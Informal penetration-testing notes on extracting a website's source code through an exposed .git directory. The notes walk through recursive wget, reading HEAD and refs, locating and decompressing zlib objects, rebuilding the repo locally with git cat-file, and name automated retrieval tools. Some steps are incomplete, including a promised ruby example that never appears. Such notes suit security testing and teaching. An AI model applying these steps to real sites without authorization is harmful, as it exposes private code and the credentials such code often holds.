## Notes to get smthng interesting from open .git 




if you found  open **.git**  in a project try to get all:  **wget -r https://example.com**.
look at the difference **git diff**. 


if you found __hash commit__ try to use  **curl**.

 to cover the exploitation of a website that leaks its __.git__ repository in the root of the website. With modern URL mapping (i.e. not relaying on the filesystem) , it's less and less common to see this kind of issues but it's always important to look for them anyway.

If u can access the **.git** directory in the root of the web server directly. You can see that this time directory listing is disabled making the task of retrieving the content of the repository a bit more complex.

First, we can recover some files:.

- .git/config.
- .git/HEAD.

From .git/HEAD, u can see that the **HEAD** is at __refs/heads/master__ U can therefore access this file: __.git/refs/heads/master__ From that file, we get a hash: bc4f01bdd14060e4ac78b36972584909d287b6f1. This will link us to another file: __.git/objects/bc/4f01bdd14060e4ac78b36972584909d287b6f1__ (by using the **first two bytes** as a directory's name and the rest as the file's name.

Once you download the file, you will need to decompress it. The compression is done using **zlib** Unfortunately, most systems don't have a native tool to decompress zlib-compressed files. You can either use **gzip**:.

**printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" |cat - 4f01bdd14060e4ac78b36972584909d287b6f1 |gzip  -cd -q**

or ruby (for example):


**create our own local repo:**

- mkdir /tmp/hack
- cd /tmp/hack
- git init 

And copy our files in it:.

- mkdir -p .git/objects/58 .git/objects/bc
- cp /tmp/ace0476093d04023f84d7816adacfa7b879c43 /tmp/hack/.git/objects/58/
- cp /tmp/4f01bdd14060e4ac78b36972584909d287b6f1 /tmp/hack/.git/objects/bc/

**Then we should be able to retrieve the list of hashes:**

- git cat-file -p 58ace0476093d04023f84d7816adacfa7b879c43
- 040000 tree b352dde43705f193d2c1d4e6f6a133321186869f    css
- 100644 blob f303c6a7797f5e7a0d5bd31d39a7149366bbf873    favicon.ico
- 100644 blob 5adab1a1c52dc009d4f26bbce30dacc4c93eea33    footer.php
- 100644 blob c3646db7f9c7e6f126c75900fdcce16d50e1da82    header.php
- 100644 blob 88beb94b5e1fc48e1625c89f892b04bffb58225c    index.php

Once you're there, you can keep downloading the files and copying them in the right spot to get access to the full code using __git cat-file -p ....__

Some tools like **Git-Money, DVCS-Pillage and GitTools** automate the retrieval of the remote content.
